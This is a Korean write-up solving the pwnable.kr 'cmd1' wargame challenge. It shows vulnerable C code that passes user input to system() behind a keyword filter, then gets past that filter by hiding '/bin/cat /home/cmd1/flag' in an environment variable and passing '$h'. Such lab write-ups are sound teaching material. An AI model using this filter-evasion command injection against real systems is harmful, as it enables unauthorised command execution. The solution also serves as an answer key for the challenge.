# [Toddler's Bottle] cmd1
cmd1에서 제공하는 글을 확인해보자.
```
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```
putty로 접속해주자.

```
cmd1@ubuntu:~$ cat cmd1.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

> * strstr(대상문자열, 검색할문자열);  
    - char *strstr(char * const _String, char const * const _SubString);  
    - 문자열을 찾았으면 문자열로 시작하는 문자열의 포인터를 반환, 문자열이 없으면 NULL을 반환

이번문제는 환경변수를 이용하는 문제인것 같다.  
게다가 strstr함수를 이용하여 인자에 `flag` `sh` `tmp`가 들어왔는지 검사한다.

h라는 환경변수를 만들어주자
```
cmd1@ubuntu:~$ export h="/bin/cat /home/cmd1/flag"
.
.
cmd1@ubuntu:~$ export
.
.
declare -x h="/bin/cat /home/cmd1/flag"
```
환경변수에 문자열이 잘 전달되었음을 확인했으므로 이제 이것을 전달해주면 해결 할 수 있다.
``
cmd1@ubuntu:~$ ./cmd1 '$h'
mommy now I get what PATH environment is for :)
``
